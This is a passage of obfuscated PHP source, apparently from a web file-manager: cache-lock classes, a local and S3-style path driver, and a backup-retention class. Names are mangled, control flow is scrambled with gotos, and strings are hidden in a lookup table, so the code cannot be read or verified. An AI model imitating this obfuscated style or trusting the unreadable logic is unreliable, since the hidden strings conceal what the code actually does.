show_tips(clear_html($åŒ÷âê) . $ŞÕï„àÒ[1494]); } return array($ŞÕï„àÒ[516] => intval($…ãÕ‘Ù¢[0]), $ŞÕï„àÒ[87] => $…ãÕ‘Ù¢[1], $ŞÕï„àÒ[1489] => array_slice($…ãÕ‘Ù¢, 1)); } } goto aÏŒØÛî; aÙƒáñê¶´: class CacheLockRedis { public function lock($‡»É­¨, $”Çøßé¥ = 10) { $¯ı®î¹¥ = Cache::init(); $—¾àŞÓò = microtime(!0) + $”Çøßé¥; while (microtime(!0) < $—¾àŞÓò) { $‹Ê¸öá = $¯ı®î¹¥->get($‡»É­¨); if (!$‹Ê¸öá) { $é„ûè…² = $¯ı®î¹¥->setLock($‡»É­¨, $—¾àŞÓò, $”Çøßé¥); if ($é„ûè…²) { return !0; } } else { if ($‹Ê¸öá < microtime(!0)) { $¯ı®î¹¥->set($‡»É­¨, $—¾àŞÓò, $”Çøßé¥ * 2); if ($¯ı®î¹¥->get($‡»É­¨) === $‹Ê¸öá) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($»´ËÒ¡ ) { return Cache::init()->get($»´ËÒ¡ ); } public function unlock($Š§©İ ») { return Cache::init()->remove($Š§©İ »); } } class CacheLockMemcached { public function lock($³öúË, $åº˜ìÏ… = 0) { $ş©’¦ºÎ = Cache::init(); $ûùàÒÓ = microtime(!0) + $åº˜ìÏ…; while (microtime(!0) < $ûùàÒÓ) { $Ç¾¬¢» = $ş©’¦ºÎ->get($³öúË); if (!$Ç¾¬¢» || $Ç¾¬¢» < microtime(!0)) { $½„ÄÃãë = $ş©’¦ºÎ->handle->add($³öúË, $ûùàÒÓ, $åº˜ìÏ…); if ($½„ÄÃãë) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($¢Ìáş˜”) { return Cache::init()->get($¢Ìáş˜”); } public function unlock($Íüï¢„‘) { return Cache::init()->remove($Íüï¢„‘); } } class CacheLockDatabase { public function lock($ĞÖ‰ÕÊÜ, $âóØ¯ˆ = 0) { $öº¾Ìşñ = Model($_SERVER[”øäÃÍª][945]); $¸ë·ìŸğ = microtime(!0) + $âóØ¯ˆ; while (microtime(!0) < $¸ë·ìŸğ) { $Ÿ·°û‚´ = $öº¾Ìşñ->get($ĞÖ‰ÕÊÜ); if (!$Ÿ·°û‚´ || $Ÿ·°û‚´ < microtime(!0)) { $Ó‚¬ëª = $öº¾Ìşñ->set($ĞÖ‰ÕÊÜ, $¸ë·ìŸğ); if ($Ó‚¬ëª) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($Ä®Š‘Ù†) { return Model($_SERVER[”øäÃÍª][945])->get($Ä®Š‘Ù†); } public function unlock($ÊÖ‹À¤•) { Model($_SERVER[”øäÃÍª][945])->remove($ÊÖ‹À¤•); } } goto CîÎÜ÷Í²«; e¿¶º‹Á±Ş: class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($Œ²ßÀáÂ) { if (substr($Œ²ßÀáÂ, 0, 2) == $_SERVER[”øäÃÍª][1478]) { $Œ²ßÀáÂ = BASIC_PATH . substr($Œ²ßÀáÂ, 2); } return $Œ²ßÀáÂ; } public function iconvApp($ƒî°ı¼ï) { $ŸôÓş§ä =& $_SERVER[”øäÃÍª]; global $config; return $this->iconvTo($ƒî°ı¼ï, $config[$ŸôÓş§ä[1602]], $config[$ŸôÓş§ä[1601]]); } public function iconvSystem($¿éªšµ) { $íâ³Ú­ =& $_SERVER[”øäÃÍª]; global $config; return $this->iconvTo($¿éªšµ, $config[$íâ³Ú­[1601]], $config[$íâ³Ú­[1602]]); } public function getPathOuter($“Ä²ßì¯) { $ıëÕøõ =& $_SERVER[”øäÃÍª]; $¡ÜıĞö© = $this->iconvApp($this->pathBase); $“Ä²ßì¯ = $this->iconvApp($“Ä²ßì¯); if (substr($¡ÜıĞö©, 0, 2) == $ıëÕøõ[1478]) { $¡ÜıĞö© = BASIC_PATH . substr($¡ÜıĞö©, 2); } if (substr($“Ä²ßì¯, 0, 2) == $ıëÕøõ[1478]) { $“Ä²ßì¯ = BASIC_PATH . substr($“Ä²ßì¯, 2); } $¡ÜıĞö© = KodIO::clear($¡ÜıĞö©); $“Ä²ßì¯ = KodIO::clear($“Ä²ßì¯); $“Ä²ßì¯ = substr($“Ä²ßì¯, strlen($¡ÜıĞö©)); if (empty($this->pathDriver)) { return $“Ä²ßì¯; } return $this->pathDriver . $ıëÕøõ[8] . ltrim($“Ä²ßì¯, $ıëÕøõ[8]); } public function mkfile($‰Ñ—––…, $¡şï¼ğÑ = '', $ù”ˆñÅñ = REPEAT_RENAME) { $‰Ñ—––… = $this->iconvSystem($‰Ñ—––…); @touch($‰Ñ—––…); if ($¡şï¼ğÑ) { file_put_contents($‰Ñ—––…, $¡şï¼ğÑ); } @chmod($‰Ñ—––…, $this->pathAuth); if (is_file($‰Ñ—––…)) { return $this->getPathOuter($‰Ñ—––…); } $this->writeLog(__FUNCTION__ . $_SERVER[”øäÃÍª][1613], !0); return !1; } public function mkdir($·Œ¢£È, $î“èòÚê = REPEAT_SKIP) { $·Œ¢£È = $this->iconvSystem($·Œ¢£È); if (is_dir($·Œ¢£È)) { return $this->getPathOuter($·Œ¢£È); } @mkdir($·Œ¢£È, $this->pathAuth, !0); @chmod($·Œ¢£È, $this->pathAuth); if (is_dir($·Œ¢£È)) { return $this->getPathOuter($·Œ¢£È); } $this->writeLog(__FUNCTION__ . $_SERVER[”øäÃÍª][1613], !0); return !1; } public function copyFile($£½ˆ’“Ö, $Ö÷µÑ¼) { $this->mkdir($this->pathFather($Ö÷µÑ¼)); $£½ˆ’“Ö = $this->iconvSystem($£½ˆ’“Ö); $Ö÷µÑ¼ = $this->iconvSystem($Ö÷µÑ¼); $ôšßşğï = copy_64($£½ˆ’“Ö, $Ö÷µÑ¼); @chmod($Ö÷µÑ¼, $this->pathAuth); if ($ôšßşğï) { return $this->getPathOuter($Ö÷µÑ¼); } $this->writeLog(__FUNCTION__ . $_SERVER[”øäÃÍª][1613], !0); return !1; } public function moveFile($–ÄÄÎÑå, $‹Ï»Ä ) { $this->mkdir($this->pathFather($‹Ï»Ä )); $–ÄÄÎÑå = $this->iconvSystem($–ÄÄÎÑå); $‹Ï»Ä  = $this->iconvSystem($‹Ï»Ä ); $æÜ©ÚÄ² = intval(@rename($–ÄÄÎÑå, $‹Ï»Ä )); if (!$æÜ©ÚÄ²) { if ($æÜ©ÚÄ² = intval(@copy_64($–ÄÄÎÑå, $‹Ï»Ä ))) { @unlink($–ÄÄÎÑå); } } @chmod($‹Ï»Ä , $this->pathAuth); if ($æÜ©ÚÄ²) { return $this->getPathOuter($‹Ï»Ä ); } $this->writeLog(__FUNCTION__ . $_SERVER[”øäÃÍª][1613], !0); return !1; } public function movePath($ŒóÇà‘³, $¹ë­§ª, $¦¸Õ·Ù¾ = false) { $çæûÇœ¨ =& $_SERVER[”øäÃÍª]; $ŒóÇà‘³ = $this->iconvSystem($ŒóÇà‘³); $¹ë­§ª = $this->iconvSystem($¹ë­§ª); $ûŸ’£ğ© = rtrim($¹ë­§ª, $çæûÇœ¨[8]) . $çæûÇœ¨[8] . ($¦¸Õ·Ù¾ ? $¦¸Õ·Ù¾ : get_path_this($ŒóÇà‘³)); if (file_exists($ûŸ’£ğ©)) { return !1; } $Ä®Ò¡ˆÀ = intval(@rename($ŒóÇà‘³, $ûŸ’£ğ©)); $Ä®Ò¡ˆÀ = file_exists($ûŸ’£ğ©); if ($Ä®Ò¡ˆÀ) { return $this->getPathOuter($ûŸ’£ğ©); } $this->writeLog(__FUNCTION__ . $çæûÇœ¨[1613], !0); return !1; } public function delFile($˜›Å‰¥ ) { $˜›Å‰¥  = $this->iconvSystem($˜›Å‰¥ ); if (!@unlink($˜›Å‰¥ )) { @chmod($˜›Å‰¥ , $this->pathAuth); if (@unlink($˜›Å‰¥ )) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[”øäÃÍª][1613], !0); return !1; } return !0; } public function delFolder($›ğáµÜ) { $¹Ò¼­—ğ =& $_SERVER[”øäÃÍª]; $›ğáµÜ = $this->iconvSystem($›ğáµÜ); if (!is_dir($›ğáµÜ)) { return !0; } if (!($ÊÈ¬ö€ = opendir($›ğáµÜ))) { return !1; } while (($ÌÈÀö£² = readdir($ÊÈ¬ö€)) !== !1) { if ($ÌÈÀö£² == $¹Ò¼­—ğ[10] || $ÌÈÀö£² == $¹Ò¼­—ğ[1423]) { continue; } $çÇÏºíÙ = $›ğáµÜ . $¹Ò¼­—ğ[8] . $ÌÈÀö£²; if (is_file($çÇÏºíÙ) || is_link($çÇÏºíÙ)) { if (!unlink($çÇÏºíÙ)) { chmod($çÇÏºíÙ, $this->pathAuth); if (!unlink($çÇÏºíÙ)) { return !1; } } } else { if (is_dir($çÇÏºíÙ)) { chmod($çÇÏºíÙ, $this->pathAuth); $çÇÏºíÙ = $this->iconvApp($çÇÏºíÙ); if (!$this->delFolder($çÇÏºíÙ)) { return !1; } } } } closedir($ÊÈ¬ö€); return rmdir($›ğáµÜ); } public function rename($€ä×Š¬Ü, $™ƒ¸–‡) { $ˆÂ—©é¤ =& $_SERVER[”øäÃÍª]; $¥…û¦ = $this->fileNameAuto($this->pathFather($€ä×Š¬Ü), $™ƒ¸–‡); $¥…û¦ = $this->iconvSystem($¥…û¦); $€ä×Š¬Ü = $this->iconvSystem($€ä×Š¬Ü); $¦—¸Ü£Ã = $this->pathFather($€ä×Š¬Ü); $Â£ß²ã¼ = rtrim($¦—¸Ü£Ã, $ˆÂ—©é¤[8]) . $ˆÂ—©é¤[8] . $¥…û¦; $îÊŞ¢Ú = @rename($€ä×Š¬Ü, $Â£ß²ã¼); $Â£ß²ã¼ = $this->iconvApp($Â£ß²ã¼); if ($îÊŞ¢Ú) { return $this->getPathOuter($Â£ß²ã¼); } $this->writeLog(__FUNCTION__ . $ˆÂ—©é¤[1613], !0); return !1; } public function size($Ÿª„ú¹‡) { $Ÿª„ú¹‡ = $this->iconvSystem($Ÿª„ú¹‡); return filesize_64($Ÿª„ú¹‡); } public function info($ş–Û¥æ·) { $ş–Û¥æ· = $this->iconvSystem($ş–Û¥æ·); if ($this->isFolder($ş–Û¥æ·)) { return $this->folderInfo($ş–Û¥æ·); } else { if ($this->isFile($ş–Û¥æ·)) { return $this->fileInfo($ş–Û¥æ·); } } return !1; } protected function infoChildren($É…Å™Ö», &$’‘²¶ õ, $•Ÿ‚‹¶ô = true) { $”Ïã÷¯ß =& $_SERVER[”øäÃÍª]; check_abort_echo(); $É…Å™Ö» = rtrim($É…Å™Ö», $”Ïã÷¯ß[8]) . $”Ïã÷¯ß[8]; if ($•Ÿ‚‹¶ô) { $É…Å™Ö» = $this->iconvSystem($É…Å™Ö»); } if (!($ùŠ©ÄÜ = @opendir($É…Å™Ö»))) { return; } while (($üÒ›¸á¸ = readdir($ùŠ©ÄÜ)) !== !1) { if ($üÒ›¸á¸ == $”Ïã÷¯ß[10] || $üÒ›¸á¸ == $”Ïã÷¯ß[1423]) { continue; } $®œõÑ¸Å = $É…Å™Ö» . $üÒ›¸á¸; if (is_file($®œõÑ¸Å) || is_link($®œõÑ¸Å)) { $’‘²¶ õ[$”Ïã÷¯ß[80]]++; $’‘²¶ õ[$”Ïã÷¯ß[79]] += filesize_64($®œõÑ¸Å); } else { if (is_dir($®œõÑ¸Å)) { $’‘²¶ õ[$”Ïã÷¯ß[81]]++; $this->infoChildren($®œõÑ¸Å, $’‘²¶ õ, !1); } } } closedir($ùŠ©ÄÜ); } private function folderInfo($×ù—öéÌ, $‡ˆŞ­ÅÀ = false) { $ ¡Ó·‡Õ =& $_SERVER[”øäÃÍª]; $×ù—öéÌ = rtrim($×ù—öéÌ, $ ¡Ó·‡Õ[8]) . $ ¡Ó·‡Õ[8]; $ŒåÊûİÒ = $this->iconvApp($this->pathThis($×ù—öéÌ)); if ($‡ˆŞ­ÅÀ) { return array($ ¡Ó·‡Õ[32] => $ŒåÊûİÒ, $ ¡Ó·‡Õ[87] => $this->getPathOuter($×ù—öéÌ), $ ¡Ó·‡Õ[33] => $ ¡Ó·‡Õ[78]); } $Ã¡ì­Ú = array($ ¡Ó·‡Õ[32] => $ŒåÊûİÒ, $ ¡Ó·‡Õ[87] => $this->getPathOuter($×ù—öéÌ), $ ¡Ó·‡Õ[33] => $ ¡Ó·‡Õ[78], $ ¡Ó·‡Õ[231] => @filectime($×ù—öéÌ), $ ¡Ó·‡Õ[88] => @filemtime($×ù—öéÌ), $ ¡Ó·‡Õ[1617] => @fileatime($×ù—öéÌ), $ ¡Ó·‡Õ[1618] => is_readable($×ù—öéÌ), $ ¡Ó·‡Õ[1619] => is_writable($×ù—öéÌ), $ ¡Ó·‡Õ[1620] => get_mode($×ù—öéÌ)); return $Ã¡ì­Ú; } private function fileInfo($ØÙñğÏÅ, $ˆÒËÒ¯Ó = false) { $­¥¦Æ”« =& $_SERVER[”øäÃÍª]; $å¿ºÁƒ› = $this->iconvApp($this->pathThis($ØÙñğÏÅ)); if ($ˆÒËÒ¯Ó) { return array($­¥¦Æ”«[32] => $å¿ºÁƒ›, $­¥¦Æ”«[87] => $this->getPathOuter($ØÙñğÏÅ), $­¥¦Æ”«[33] => $­¥¦Æ”«[230], $­¥¦Æ”«[79] => $this->size($ØÙñğÏÅ), $­¥¦Æ”«[166] => $this->ext($å¿ºÁƒ›)); } $‚«µù£² = array($­¥¦Æ”«[32] => $å¿ºÁƒ›, $­¥¦Æ”«[87] => $this->getPathOuter($ØÙñğÏÅ), $­¥¦Æ”«[33] => $­¥¦Æ”«[230], $­¥¦Æ”«[231] => @filectime($ØÙñğÏÅ), $­¥¦Æ”«[88] => @filemtime($ØÙñğÏÅ), $­¥¦Æ”«[1617] => @fileatime($ØÙñğÏÅ), $­¥¦Æ”«[79] => $this->size($ØÙñğÏÅ), $­¥¦Æ”«[166] => $this->ext($å¿ºÁƒ›), $­¥¦Æ”«[1618] => is_readable($ØÙñğÏÅ), $­¥¦Æ”«[1619] => is_writable($ØÙñğÏÅ), $­¥¦Æ”«[1620] => get_mode($ØÙñğÏÅ)); return $‚«µù£²; } public function exist($Ñ…Û»¹û) { $Ñ…Û»¹û = $this->iconvSystem($Ñ…Û»¹û); return @file_exists($Ñ…Û»¹û); } public function isFile($ØŸø¥°Ñ) { $ØŸø¥°Ñ = $this->iconvSystem($ØŸø¥°Ñ); return @is_file($ØŸø¥°Ñ); } public function isFolder($Ô§Ìõ¿ü) { $Ô§Ìõ¿ü = $this->iconvSystem($Ô§Ìõ¿ü); return @is_dir($Ô§Ìõ¿ü); } public function listPath($î€ïî™Ü, $‡ªä÷İ = false) { $·Åı“›À =& $_SERVER[”øäÃÍª]; $î€ïî™Ü = $this->iconvSystem($î€ïî™Ü); $î€ïî™Ü = rtrim($î€ïî™Ü, $·Åı“›À[8]) . $·Åı“›À[8]; $ôò®êõ = array($·Åı“›À[85] => array(), $·Åı“›À[86] => array()); if (!($–üºÇùº = @opendir($î€ïî™Ü))) { return $ôò®êõ; } while (($àëë¯ÈÙ = readdir($–üºÇùº)) !== !1) { if ($àëë¯ÈÙ == $·Åı“›À[10] || $àëë¯ÈÙ == $·Åı“›À[1423]) { continue; } $ıÊïô¬İ = $î€ïî™Ü . $àëë¯ÈÙ; if (is_file($ıÊïô¬İ)) { $ôò®êõ[$·Åı“›À[86]][] = $this->fileInfo($ıÊïô¬İ, $‡ªä÷İ); } else { $ôò®êõ[$·Åı“›À[85]][] = $this->folderInfo($ıÊïô¬İ, $‡ªä÷İ); } } closedir($–üºÇùº); return $ôò®êõ; } public function listAll($ê÷¼®§Å, &$—Í—¤½ = array()) { $²¥™İÛŠ =& $_SERVER[”øäÃÍª]; $ê÷¼®§Å = $this->iconvSystem($ê÷¼®§Å); $ê÷¼®§Å = rtrim($ê÷¼®§Å, $²¥™İÛŠ[8]) . $²¥™İÛŠ[8]; if (!($¹ä£¦ÉÊ = @opendir($ê÷¼®§Å))) { return $—Í—¤½; } while (($ğ°œ´°Ñ = readdir($¹ä£¦ÉÊ)) !== !1) { if ($ğ°œ´°Ñ == $²¥™İÛŠ[10] || $ğ°œ´°Ñ == $²¥™İÛŠ[1423]) { continue; } $†é½ƒĞ = $ê÷¼®§Å . $ğ°œ´°Ñ; $±Ê•ä·‹ = is_dir($†é½ƒĞ) && !is_link($†é½ƒĞ) ? 1 : 0; $†é½ƒĞ = $±Ê•ä·‹ ? $†é½ƒĞ . $²¥™İÛŠ[8] : $†é½ƒĞ; $—Í—¤½[] = array($²¥™İÛŠ[87] => $this->getPathOuter($†é½ƒĞ), $²¥™İÛŠ[78] => $±Ê•ä·‹, $²¥™İÛŠ[88] => intval(@filemtime($†é½ƒĞ)), $²¥™İÛŠ[79] => $±Ê•ä·‹ ? 0 : intval($this->size($†é½ƒĞ))); if ($±Ê•ä·‹) { $this->listAll($†é½ƒĞ, $—Í—¤½); } } closedir($¹ä£¦ÉÊ); return $—Í—¤½; } public function has($â«¢Ï¬, $¿òÔ¨º = false, $“êØ¨ÍŠ = true) { $é»Ó…¯ß =& $_SERVER[”øäÃÍª]; $â«¢Ï¬ = $this->iconvSystem($â«¢Ï¬); $â«¢Ï¬ = rtrim($â«¢Ï¬, $é»Ó…¯ß[8]) . $é»Ó…¯ß[8]; if (!($±¹›Îû = @opendir($â«¢Ï¬))) { return !1; } $ÔÉÎòÚµ = 0; $¢ğÔœÆ  = 0; $ù¯ÍİÙÃ = 0; while (($Ô»£¼Ï• = readdir($±¹›Îû)) !== !1) { if ($Ô»£¼Ï• == $é»Ó…¯ß[10] || $Ô»£¼Ï• == $é»Ó…¯ß[1423]) { continue; } $î¹ „ªê = $â«¢Ï¬ . $Ô»£¼Ï•; if ($¿òÔ¨º) { $ù¯ÍİÙÃ++; if (@is_file($î¹ „ªê)) { $ÔÉÎòÚµ++; } else { $¢ğÔœÆ ++; } if ($ù¯ÍİÙÃ > 10000) { break; } continue; } if ($“êØ¨ÍŠ) { if (@is_file($î¹ „ªê)) { return !0; } } else { if (@is_dir($î¹ „ªê . $é»Ó…¯ß[8])) { return !0; } } } closedir($±¹›Îû); if ($¿òÔ¨º) { return array($é»Ó…¯ß[239] => $ÔÉÎòÚµ, $é»Ó…¯ß[240] => $¢ğÔœÆ ); } return !1; } public function hashSimple($ĞÅÙ‚Üö) { $Ò¢ƒ˜óš =& $_SERVER[”øäÃÍª]; if (!$ĞÅÙ‚Üö) { return md5($Ò¢ƒ˜óš[12]); } $ĞÅÙ‚Üö = $this->iconvSystem($ĞÅÙ‚Üö); $¿¦•¶ = $this->size($ĞÅÙ‚Üö); $·Ë‘ï‡Å = 200; $±ŒçÒÏ = 50; if ($¿¦•¶ <= $·Ë‘ï‡Å * $±ŒçÒÏ) { return $this->hashMd5($ĞÅÙ‚Üö) . $¿¦•¶; } $ä¸òù´Í = $Ò¢ƒ˜óš[12]; $¦ºò¸íĞ = intval($¿¦•¶ / $±ŒçÒÏ); $Ã‡–ÌÈË = fopen($ĞÅÙ‚Üö, $Ò¢ƒ˜óš[1621]); if (!$Ã‡–ÌÈË) { return $ä¸òù´Í; } for ($„Ññöê = 0; $„Ññöê < $±ŒçÒÏ; $„Ññöê++) { fseek_64($Ã‡–ÌÈË, $¦ºò¸íĞ * $„Ññöê); $ä¸òù´Í .= fread($Ã‡–ÌÈË, $·Ë‘ï‡Å); } fseek_64($Ã‡–ÌÈË, $¿¦•¶ - $·Ë‘ï‡Å); $ä¸òù´Í .= fread($Ã‡–ÌÈË, $·Ë‘ï‡Å); fclose($Ã‡–ÌÈË); return md5($ä¸òù´Í) . $¿¦•¶; } public function getContent($‡§º©Š) { $‡§º©Š = $this->iconvSystem($‡§º©Š); return file_get_contents($‡§º©Š); } public function setContent($ÂÙè¡ç•, $¹ï¹Ç = '') { $ÂÙè¡ç• = $this->iconvSystem($ÂÙè¡ç•); $¡Õà‰Á = @file_put_contents($ÂÙè¡ç•, $¹ï¹Ç, LOCK_EX); if (!$¡Õà‰Á) { $this->writeLog(__FUNCTION__ . $_SERVER[”øäÃÍª][1613], !0); } clearstatcache(); @chmod($ÂÙè¡ç•, $this->pathAuth); return $¡Õà‰Á === !1 ? !1 : !0; } public function fileSubstr($‰›¿•û§, $ÇÛö¾Ğ = 0, $¸Ü±£  = false) { $Üß«‰‚ş =& $_SERVER[”øäÃÍª]; $‰›¿•û§ = $this->iconvSystem($‰›¿•û§); if ($¸Ü±£  === !1) { $¸Ü±£  = $this->size($‰›¿•û§); } if ($¸Ü±£  <= 0) { return $Üß«‰‚ş[12]; } $ûÅäÏ = fopen($‰›¿•û§, $Üß«‰‚ş[1621]); if (!$ûÅäÏ) { return !1; } fseek_64($ûÅäÏ, $ÇÛö¾Ğ); $œ¨¹¾ä = fread($ûÅäÏ, $¸Ü±£ ); fclose($ûÅäÏ); if (!$œ¨¹¾ä) { $this->writeLog(__FUNCTION__ . $Üß«‰‚ş[1613], !0); } return $œ¨¹¾ä; } public function upload($éÅÈÕòµ, $Û†®Šƒ, $“¥î¶ÈÃ = false, $ÄÁ€óûé = REPEAT_REPLACE) { if (!$Û†®Šƒ || !@file_exists($Û†®Šƒ)) { return !1; } if ($“¥î¶ÈÃ) { return $this->moveFile($Û†®Šƒ, $éÅÈÕòµ); } return $this->copyFile($Û†®Šƒ, $éÅÈÕòµ); } public function setModifyTime($‹­·Ú®µ, $õ‘ğæ‘Ä = '') { @touch($‹­·Ú®µ, intval($õ‘ğæ‘Ä)); } public function download($ï§ÁøÜ¿, $»úŸ‹ù¶) { return $this->iconvSystem($ï§ÁøÜ¿); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($îÄ¿‘¢) { parent::__construct($îÄ¿‘¢); $this->setSignVersion($_SERVER[”øäÃÍª][247]); } public function fileOutImage($ÑÏ¼„áä, $ş¬„ñ²Ö = 250) { $åï•¼ã =& $_SERVER[”øäÃÍª]; if ($this->size($ÑÏ¼„áä) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ÑÏ¼„áä, $ş¬„ñ²Ö); } $Šìğü¨ = array($åï•¼ã[1622] => $åï•¼ã[1623] . $ş¬„ñ²Ö . $åï•¼ã[1624]); $Õô¿ô’ = $this->link($ÑÏ¼„áä, $Šìğü¨); $this->fileOutLink($Õô¿ô’); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ğâ§Ğ¿Ç) { parent::__construct($ğâ§Ğ¿Ç); $this->setSignVersion($_SERVER[”øäÃÍª][247]); } public function uploadFormData($÷ØùÕ², $ ğÂÍÛ¬ = 3600) { return $this->uploadFormDataV2($÷ØùÕ², $ ğÂÍÛ¬); } } goto cšÅÕõÑÇ¹; A„òíËê°Ó: class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[”øäÃÍª][857]); $this->init(); $this->keep(); } public function init() { $ì­ğı½ =& $_SERVER[”øäÃÍª]; $this->isManual(); self::$name = date($ì­ğı½[858]); if (!($‰Çæş€ = $this->model->lastItem())) { $‰Çæş€ = $this->initData(); } else { self::$name = $‰Çæş€[$ì­ğı½[32]]; if ($‰Çæş€[$ì­ğı½[859]] == $ì­ğı½[91]) { self::$name = date($ì­ğı½[259]); $®­Ğçú = intval(_get($‰Çæş€, $ì­ğı½[860], 0)); if (self::$manual == 0 && $‰Çæş€[$ì­ğı½[32]] == self::$name) { $this->model->remove($‰Çæş€[$ì­ğı½[487]]); } $‰Çæş€ = $this->initData($®­Ğçú, $‰Çæş€[$ì­ğı½[861]]); } else { $this->checkStore($‰Çæş€[$ì­ğı½[861]]); } } self::$option = $‰Çæş€; } private function isManual() { $â©÷÷Åû = _get($GLOBALS, $_SERVER[”øäÃÍª][862], 0); $â©÷÷Åû = intval($â©÷÷Åû); self::$manual = $â©÷÷Åû && $â©÷÷Åû == 1 ? 1 : 0; } private function initData($ßèùÎ¨¶ = 0, $¥Êô–ï¸ = '') { $ğşú–Ú =& $_SERVER[”øäÃÍª]; $×ÌÄÕÔ˜ = $this->model->config(); if ($¥Êô–ï¸ && $×ÌÄÕÔ˜[$ğşú–Ú[861]] != $¥Êô–ï¸) { $ßèùÎ¨¶ = 0; } $this->checkStore($×ÌÄÕÔ˜[$ğşú–Ú[861]]); if (self::$manual == 1) { self::$name .= $ğşú–Ú[11] . date($ğşú–Ú[863]); } $­ÖÎª× = array($ğşú–Ú[861] => $×ÌÄÕÔ˜[$ğşú–Ú[861]], $ğşú–Ú[32] => self::$name, $ğşú–Ú[859] => 0, $ğşú–Ú[168] => $×ÌÄÕÔ˜[$ğşú–Ú[168]], $ğşú–Ú[864] => self::$manual, $ğşú–Ú[865] => array($ğşú–Ú[866] => array($ğşú–Ú[859] => 0), $ğşú–Ú[867] => array($ğşú–Ú[859] => 0, $ğşú–Ú[868] => 0, $ğşú–Ú[869] => 0, $ğşú–Ú[33] => $ğşú–Ú[12], $ğşú–Ú[870] => 0, $ğşú–Ú[871] => 0), $ğşú–Ú[872] => array($ğşú–Ú[859] => 0, $ğşú–Ú[868] => 0, $ğşú–Ú[869] => 0, $ğşú–Ú[870] => 0, $ğşú–Ú[871] => 0), $ğşú–Ú[230] => array($ğşú–Ú[859] => 0, $ğşú–Ú[873] => 0, $ğşú–Ú[874] => 0, $ğşú–Ú[875] => 0, $ğşú–Ú[876] => 0, $ğşú–Ú[565] => $ßèùÎ¨¶, $ğşú–Ú[870] => 0, $ğşú–Ú[871] => 0)), $ğşú–Ú[870] => time(), $ğşú–Ú[871] => 0); $‘•“ç˜® = $this->model->insert($­ÖÎª×); $­ÖÎª×[$ğşú–Ú[487]] = $‘•“ç˜®; return $­ÖÎª×; } private function checkStore($Á¨Âò•î) { $­÷­Çß = Model($_SERVER[”øäÃÍª][877]); $×±‡÷Ü‚ = $­÷­Çß->listData($Á¨Âò•î); $­÷­Çß->checkConfig($×±‡÷Ü‚); } public static function get() { if (!self::$option) { $ÕäåëÅ = Model($_SERVER[”øäÃÍª][857]); $û¸Ö®Ø = $ÕäåëÅ->findByName(self::$name); $ÕäåëÅ->parseContent($û¸Ö®Ø); self::$option = $û¸Ö®Ø; } return self::$option; } public static function set($Ñ¸ãêº°) { $Ùµ€šÓ =& $_SERVER[”øäÃÍª]; $áäÅ¶Ø = self::get(); foreach ($Ñ¸ãêº° as $ º‘¿¥ş => $Ê¡µÚÑ) { array_set_value($áäÅ¶Ø, $ º‘¿¥ş, $Ê¡µÚÑ); } Model($Ùµ€šÓ[857])->update($áäÅ¶Ø[$Ùµ€šÓ[487]], $áäÅ¶Ø); self::$option = $áäÅ¶Ø; return self::$option; } public function keep() { $º›Œ÷¹µ =& $_SERVER[”øäÃÍª]; $¿¯Åôª‡ = self::get(); if (_get($¿¯Åôª‡, $º›Œ÷¹µ[878], 0) == $º›Œ÷¹µ[91]) { return; } $this->backupKeep($¿¯Åôª‡); self::set(array($º›Œ÷¹µ[878] => 1)); } private function backupKeep($çŞÔİĞ¢) { $Ëó·™İÅ =& $_SERVER[”øäÃÍª]; if (self::$manual == 1) { return; } $—Ëûùè¦ = $this->model->listData(); if (empty($—Ëûùè¦)) { return; } $ÀÚÙ¹²¡ = array(); $şÕğêüº = array(); $å¿µàãˆ = date($Ëó·™İÅ[879], strtotime($Ëó·™İÅ[880])); foreach ($—Ëûùè¦ as $€´ò„½Ë => $êìŞÕî˜) { $ó˜¿±İ” = $êìŞÕî˜[$Ëó·™İÅ[32]]; if ($€´ò„½Ë < 7 || $êìŞÕî˜[$Ëó·™İÅ[864]] == $Ëó·™İÅ[91]) { $ÀÚÙ¹²¡[] = $ó˜¿±İ”; continue; } $È«Ëåê‰ = substr($ó˜¿±İ”, 0, 6); if ($È«Ëåê‰ < $å¿µàãˆ) { continue; } if (!isset($şÕğêüº[$È«Ëåê‰]) || $ó˜¿±İ” < $şÕğêüº[$È«Ëåê‰]) { $şÕğêüº[$È«Ëåê‰] = $ó˜¿±İ”; } if (substr($ó˜¿±İ”, 6, 2) == $Ëó·™İÅ[881]) { $şÕğêüº[$È«Ëåê‰] = $ó˜¿±İ”; } } $ÀÚÙ¹²¡ = array_merge($ÀÚÙ¹²¡, array_values($şÕğêüº)); $ÀÚÙ¹²¡ = array_unique($ÀÚÙ¹²¡); foreach ($—Ëûùè¦ as $êìŞÕî˜) { $ó˜¿±İ” = $êìŞÕî˜[$Ëó·™İÅ[32]]; if (!empty($ó˜¿±İ”) && in_array($ó˜¿±İ”, $ÀÚÙ¹²¡)) { continue; } $this->model->remove($êìŞÕî˜[$Ëó·™İÅ[487]]); $´†Ò£¯Õ = $this->backupPath($çŞÔİĞ¢); IO::remove($´†Ò£¯Õ, !1); } } private function backupPath($‘¤ÑÍŠš) { $¹ÔéÌ¯  =& $_SERVER[”øäÃÍª]; static $ØµÅÆ¬ = null; if (is_null($ØµÅÆ¬)) { $ØµÅÆ¬ = Model($¹ÔéÌ¯ [882])->get($¹ÔéÌ¯ [883]); } $Ñãíç¿œ = $‘¤ÑÍŠš[$¹ÔéÌ¯ [32]]; $ÍÑ½Æ = substr(md5($¹ÔéÌ¯ [884] . $ØµÅÆ¬ . $Ñãíç¿œ), 0, 8); return "\x7b\x69\x6f\x3a{$‘¤ÑÍŠš[$¹ÔéÌ¯ [861]]}\175\x2f\x64\x61\x74\x61\142\141\163\x65\x2f\x62\141\143\x6b\165\x70\x2f" . $Ñãíç¿œ . $¹ÔéÌ¯ [11] . $ÍÑ½Æ; } public function db() { $÷ô±ÏÀÊ =& $_SERVER[”øäÃÍª]; $™Òùƒ« = self::get(); if (_get($™Òùƒ«, $÷ô±ÏÀÊ[885], 0) == $÷ô±ÏÀÊ[91]) { return !0; } $Ô¦æ†Î = new BackupDb(); if 